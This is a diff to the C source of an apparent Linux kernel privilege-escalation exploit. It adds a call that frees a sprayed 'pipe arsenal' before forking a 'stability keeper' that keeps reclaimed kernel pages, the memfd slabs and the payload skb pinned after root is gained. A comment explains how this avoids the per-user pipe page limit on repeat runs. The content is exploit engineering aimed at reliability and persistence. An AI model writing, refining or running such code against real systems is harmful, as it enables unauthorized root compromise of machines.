@@ -450,6 +450,14 @@ int run_exploit(int argc, char **argv) {
   }
   int exploit_ok = atomic_load(&cfi_stage_done) && root_child_done;
   if (exploit_ok) {
+    /*
+     * Release the pipe arsenal before forking the keeper: F_SETPIPE_SZ
+     * growth is charged per-real-uid (fs.pipe-user-pages-soft), and the
+     * keeper would otherwise inherit hundreds of 32-slot pipes, pushing
+     * any subsequent run on this boot past the soft limit -> EPERM.
+     * The keeper only needs to pin the memfd slabs and the payload skb.
+     */
+    reset_pipe_attempt();
     pid_t keeper = spawn_allocation_keeper();
     pr_success("stability keeper pid=%d retaining reclaimed kernel pages\n",
                keeper);
